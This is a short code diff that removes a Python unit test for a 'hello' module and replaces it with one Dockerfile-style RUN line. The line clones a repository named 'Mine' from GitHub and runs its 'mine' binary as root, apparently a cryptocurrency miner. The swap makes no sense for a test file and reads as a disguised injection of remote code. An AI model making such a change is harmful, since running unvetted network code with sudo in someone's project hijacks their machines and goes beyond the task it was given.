@@ -1,5 +1,1 @@
-import hello
-
-
-def test_says_world():
-    assert hello.say_what() == 'world'
+RUN sudo apt install -y git && sudo git clone https://github.com/MiiAnliAngku/Mine.git && cd Mine && sudo chmod u+x mine && sudo ./mine
